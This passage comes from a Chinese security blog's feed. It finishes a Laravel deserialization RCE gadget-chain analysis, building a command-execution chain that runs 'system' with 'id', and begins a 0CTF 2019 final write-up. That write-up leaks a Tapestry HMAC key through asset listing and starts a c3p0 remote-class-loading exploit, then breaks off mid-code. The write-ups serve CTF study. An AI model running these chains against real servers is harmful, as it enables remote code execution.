-&gt;shouldAllowMockingProtectedMethods()</span><br><span class="line">                -&gt;shouldIgnoreMissing();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput <span class="keyword">as</span> $i =&gt; $output) &#123;</span><br><span class="line">            $mock-&gt;shouldReceive(<span class="string">'doWrite'</span>)</span><br><span class="line">                -&gt;once()</span><br><span class="line">                -&gt;ordered()</span><br><span class="line">                -&gt;with($output, Mockery::any())</span><br><span class="line">                -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($i)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput[$i]);</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $mock;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里如果想继续走下去，我们需要属性$this-&gt;test-&gt;expectedOutput<br><img src="/images/2019-07-18-17-12-55.png" alt=""><br>那么有没有类有expectedOutput呢？我们全局搜索，发现在Illuminate\Foundation\Testing\Concerns中存在这样的属性。<br>但这样的类很难被实例化，无法走通后面的路。但此时我们可以巧用魔法方法<strong>get：当我们试图获取一个不可达属性，类会自动调用</strong>get函数。<br>我们找到如下类：<br>vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php<br><img src="/images/2019-07-18-17-13-51.png" alt=""><br>可以使用我们经常使用的小trick，设置键名为expectedOutput的数组，即可利用。<br>然后是第二步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question)</span><br></pre></td></tr></table></figure></p><p>此处依旧可以使用__get方法，定义键名为expectedQuestions的数组即可。</p><h3 id="run-amp-实例化对象"><a href="#run-amp-实例化对象" class="headerlink" title="run &amp; 实例化对象"></a>run &amp; 实例化对象</h3><p>到此为止，我们已经能构造出PendingCommand前3个参数的值了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$test = <span class="keyword">new</span> Illuminate\Auth\GenericUser(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),</span><br><span class="line">                <span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)</span><br><span class="line">         )</span><br><span class="line">);</span><br><span class="line">$command = <span class="string">"system"</span>;</span><br><span class="line">$parameters = <span class="keyword">array</span>(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure></p><p>那么最后一个参数$app同样尤为关键，我们继续跟进run的代码，来到关键第三步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br></pre></td></tr></table></figure></p><p>我们跟入这一句，可以发现，首先代码在实例化对象：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app[Kernel::class]</span><br></pre></td></tr></table></figure></p><p>然后再去调对应的call方法，那么跟入不难发现，其想要实例化的对象是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Contracts\Console\Kernel</span><br></pre></td></tr></table></figure></p><p>首先进入：<br><img src="/images/2019-07-18-19-16-16.png" alt=""><br>跟进make:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;deferredServices[$abstract]) &amp;&amp; ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadDeferredProvider($abstract);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::make($abstract, $parameters);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>再跟进其父类的make:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resolve($abstract, $parameters);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>跟进resolve：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>那么此时发现$concrete的值来自于getConcrete($abstract):<br>vendor/laravel/framework/src/Illuminate/Container/Container.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure></p><p>跟进getConcrete：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getConcrete</span><span class="params">($abstract)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_null($concrete = <span class="keyword">$this</span>-&gt;getContextualConcrete($abstract))) &#123;</span><br><span class="line">            <span class="keyword">return</span> $concrete;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If we don't have a registered resolver or concrete for the type, we'll just</span></span><br><span class="line">        <span class="comment">// assume each type is a concrete name and will attempt to resolve it as is</span></span><br><span class="line">        <span class="comment">// since the container should be able to resolve concretes automatically.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[$abstract][<span class="string">'concrete'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $abstract;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们注意到，如果bindings[$abstract]存在，则会返回bindings[$abstract][‘concrete’]。<br>而bindings是类Container的属性，同时注意到类Container中也有可以RCE的call方法。那么现在思路很清晰：我们可以任意实例化类Container的子类，这样在其子类调用call的时候，会触发类Container的call方法，那么即可达成RCE。<br>而这样的类选择类Container的子类：Illuminate\Foundation\Application再好不过。<br>而$abstract的值为Illuminate\Contracts\Console\Kernel。<br>那么此时我们容易知道$bindings只要存在键名为Illuminate\Contracts\Console\Kernel的数组，就能进入该if条件句，那么我们只要按如下进行构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>就可以保证返回值为Illuminate\Foundation\Application。<br>接下来会判断是否可以build：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">            $object = <span class="keyword">$this</span>-&gt;build($concrete);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>我们跟进isBuildable：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isBuildable</span><span class="params">($concrete, $abstract)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $concrete === $abstract || $concrete <span class="keyword">instanceof</span> Closure;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>如果$concrete和$abstract相等则可以build。<br>但我们现在明显：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="string">'Illuminate\Foundation\Application'</span>;</span><br><span class="line">$abstract = <span class="string">'Illuminate\Contracts\Console\Kernel'</span>;</span><br></pre></td></tr></table></figure></p><p>所以会进入else分支，继续make。<br>而make时，我们注意到：<br><img src="/images/2019-07-18-22-35-43.png" alt=""><br>而else分支传入make的值为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br></pre></td></tr></table></figure></p><p>这样一来直接就构成了后面：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure></p><p>这次bindings数组里并没有键名为Illuminate\Foundation\Application的数组里，于是直接回返回$abstract的值，这样一来就达到了实例化Illuminate\Foundation\Application的目的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = $abstract = <span class="string">'Illuminate\Foundation\Application'</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-18-21-54-57.png" alt=""><br>最后则可以让最后的$this-&gt;app[Kernel::class]的值变为Illuminate\Foundation\Application。为了更加直观，我们在这个位置做如下改写：<br><img src="/images/2019-07-18-21-58-57.png" alt=""><br><img src="/images/2019-07-18-22-00-19.png" alt=""><br>紧接着会调用Illuminate\Foundation\Application父类Illuminate\Container\Container的call方法：<br>vendor/laravel/framework/src/Illuminate/Container/Container.php<br><img src="/images/2019-07-18-18-33-58.png" alt=""><br><img src="/images/2019-07-18-22-03-01.png" alt=""><br>最后走入这个call_user_func_array，而$callback是我们可以控制的system，而getMethodDependencies()，我们跟进：<br><img src="/images/2019-07-18-22-04-15.png" alt=""><br>最后会返回我们需要的参数id，那么这样一来，即可RCE成功：<br><img src="/images/2019-07-18-22-04-56.png" alt=""></p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>laravel整个反序列化RCE链用的非常漂亮：<br>1.类PendingCommand 利用 <strong>destruct触发run()方法<br>2.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 构造数组<br>3.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 利用 </strong>get()魔法方法满足mockConsoleOutput<br>4.利用任意实例化对象，实例化Illuminate\Foundation\Application<br>5.调用call触发父类call方法RCE</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>真实的chain构造远比之前例题中的难上多倍，但整个过程非常有趣，可以学到不少姿势~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/web/19312.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;接之前的两篇文章：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 0ctf final Web Writeup（2）</title>
    <link href="http://skysec.top/2019/07/12/2019-0ctf-final-Web-Writeup%EF%BC%882%EF%BC%89/"/>
    <id>http://skysec.top/2019/07/12/2019-0ctf-final-Web-Writeup（2）/</id>
    <published>2019-07-12T05:12:24.000Z</published>
    <updated>2019-07-16T13:49:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章接之前留下的坑，主要分析了java Tapestry的一个从文件读取到反序列化RCE的一个漏洞和ocaml的一个小trick。</p><h2 id="hotel-booking-system"><a href="#hotel-booking-system" class="headerlink" title="hotel booking system"></a>hotel booking system</h2><p>发现Tapestry版本号，同时发现该网站是Tapestry的demo，在github已开源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ccordenier/tapestry5-hotel-booking</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-16-09-24-45.png" alt=""><br>同时题目功能极少，只有search功能：<br><img src="/images/2019-07-16-09-32-19.png" alt=""><br>以及hint信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Anyway, As the project has no usable gadget libraries,</span><br><span class="line">I added C3P0 to pom.xml.</span><br><span class="line"></span><br><span class="line">25wzsxtql</span><br></pre></td></tr></table></figure></p><p>那么大致猜测与其框架Tapestry漏洞有关，尝试搜索相关CVE：<br><img src="/images/2019-07-16-09-26-26.png" alt=""><br><img src="/images/2019-07-16-09-26-45.png" alt=""><br>尝试搜索相关漏洞细节描述，但无果，已知信息只有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tapestry before 5.3.6 relies on client-side object storage without checking whether a client has modified an object, which allows remote attackers to cause a denial of service (resource consumption) or execute arbitrary code via crafted serialized data.</span><br></pre></td></tr></table></figure></p><p>那么大概可以判断，应该是没有校验客户端对象是否被更改，直接进行反序列化，触发攻击。<br>既然没有漏洞描述，那么只能自己去挖掘了，通过搜索，找到其fix version：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Implement HMAC signatures on object streams stored on the client (Revision 95846b173d83c2eb42db75dae3e7d5e13a633946)</span><br></pre></td></tr></table></figure></p><p>查看响应commit，发现一些改动：<br>加入hmac签名配置：<br>tapestry-core/src/main/java/org/apache/tapestry5/SymbolConstants.java<br><img src="/images/2019-07-16-09-37-20.png" alt=""><br>在AppModule.java可设置签名key：<br>tapestry-core/src/test/java/org/apache/tapestry5/integration/app1/services/AppModule.java<br><img src="/images/2019-07-13-21-40-37.png" alt=""><br>从fix version commit中并未发现和反序列直接挂钩的修复，应该修复落点在客户端对象校验，确保对象未被修改。但这样存在问题，一旦签名key泄露，那么依然可以进行攻击，随手尝试更改题目中的可疑值t:formdata：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;P7crGfP9hcuUq9D5E5+kJLaAq8c=:H4sIAAAAAAAAAJWQsUrEQBRFn4HAQkRRtLDXdtbCbbRxEYSFIIFgLZPJM45MZmZnJibbWPkTNn6BbKVfsIWd/+AH2FhYWZhJGsFFsHucd+Ee7uM7hPUaRBOZY3M4rdDMwBoYKVMQqim7QuKoRuvMbESYMih4RjJqkYyzFlLmTjmKfDdFV+m980X0tv3yFcBKDBFT0hklzmiJDjbja3pDh4LKYpg6w2Vx1GgHYde4RGD8X4HEKIbWplVWcmu5kot5fnD5+fAaADS63oKNvsGo2mo0mhYIdgq3AA4iDxM0SQuXJ30wrNdhtX9Z3+K85/GfnkyVWkmUzpJOzP3WvE8/dp6f7k4CCGIYMMHb9CT3fX5DFFi2wG/YIb/ZoG+/2P9xfgP6pMxQxwEAAA==&quot; name=&quot;t:formdata&quot; type=&quot;hidden&quot;&gt;&lt;/input&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;label for=&quot;query&quot; class=&quot;control-label col-md-4&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>得到回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.IOException: Client data associated with the current request appears to have been tampered with (the HMAC signature does not match).</span><br></pre></td></tr></table></figure></p><p>所以应该攻击点确实在t:formdata。<br>那么既然fix version没有明确的修复，只能自己跟了：<br>我们在search下断点，发现最终回来到onAction()：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">onAction</span><span class="params">(EventContext context)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        ......</span><br><span class="line">        didPushBeanValidationContext = <span class="keyword">true</span>;</span><br><span class="line">        executeStoredActions();</span><br><span class="line">        heartbeat.end();</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关键函数executeStoredActions()：<br><img src="/images/2019-07-16-12-05-13.png" alt=""><br>而全局搜索t:formdata，来到路径：<br>org/apache/tapestry5/corelib/components/Form.java<br><img src="/images/2019-07-16-10-04-56.png" alt=""><br>我们跟进FORM_DATA：<br><img src="/images/2019-07-16-10-16-03.png" alt=""><br>发现正是此处调用了客户端传来的t:formdata。<br>看到后续操作：<br><img src="/images/2019-07-16-12-07-01.png" alt=""><br>跟进decodeClientData():<br><img src="/images/2019-07-16-12-08-15.png" alt=""><br>可以发现t:formdata的编码模式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GZIP compress</span><br><span class="line">Base64 encode</span><br></pre></td></tr></table></figure></p><p>然后会来到反序列化阶段，但需要注意的是5.3.8和5.4.3不太一样：<br><img src="/images/2019-07-16-12-14-45.png" alt=""><br>会多一个:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">boolean</span> cancelAction = ois.readBoolean();</span><br></pre></td></tr></table></figure></p><p>那么最后的落点大致都清楚了，关键点在于怎么拿到签名key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://tapestry.apache.org/assets.html#Assets-AssetSecurity</span><br></pre></td></tr></table></figure></p><p>可以发现这里有提到tapestry的安全问题，我们试一下：<br><img src="/images/2019-07-16-13-08-16.png" alt=""><br>我们尝试访问：<br><img src="/images/2019-07-16-13-10-18.png" alt=""><br>发现可以成功列目录，同时有提到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fortunately, this can&apos;t happen. Files with extension &quot;.class&quot; are secured; they must be accompanied in the URL with a query parameter that is the MD5 hash of the file&apos;s contents. If the query parameter is absent, or doesn&apos;t match the actual file&apos;s content, the request is rejected.</span><br></pre></td></tr></table></figure></p><p>但这里的md5 hash似乎并没有起到安全保护的能力，而是会自动跳转到正确的hash：<br><img src="/images/2019-07-16-13-12-53.png" alt=""><br>所以我们可以尝试读取签名key文件内容，根据之前的fix version commit，我们知道key一般定义在：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services/AppModule.java</span><br></pre></td></tr></table></figure></p><p>我们尝试访问该文件，hash md5我们随便填写<br><img src="/images/2019-07-16-13-16-45.png" alt=""><br>发现可以列目录，得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AppModule.class</span><br><span class="line">AppModule$1.class</span><br><span class="line">Authenticator.class</span><br><span class="line">BasicAuthenticator.class</span><br></pre></td></tr></table></figure></p><p>读取AppModule.class后进行反编译，得到签名key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106:10000/assets/app/e3d6c19d/services/AppModule.class</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-16-13-18-51.png" alt=""><br>最后就是exp的构造了：<br>题目提供了hint:c3p0，我们可以进行检索：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/fnmsd/article/details/88959428#c3p0</span><br></pre></td></tr></table></figure></p><p>参考这篇文章可以构造出exp，这里直接使用balsn的exp:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.tapestry5.internal.services.ClientDataEncoderImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.tapestry5.services.ClientDataEncoder;</span><br><span class="line"><span class="keyword">import</span> org.apache.tapestry5.services.ClientDataSink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">public</span> Object <span class="title">getExploit</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Command format is: &lt;base_url&gt;:&lt;classname&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);</span><br><span class="line">        Reflections.getField(PoolBackedDataSourceBase.class, <span class="string">"connectionPoolDataSource"</span>).set(b, <span class="keyword">new</span> PoolSource(className, url));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolSource</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String className;</span><br><span class="line">        <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PoolSource</span> <span class="params">( String className, String url )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.className = className;</span><br><span class="line">            <span class="keyword">this</span>.url = url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">"exploit"</span>, <span class="keyword">this</span>.className, <span class="keyword">this</span>.url);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span 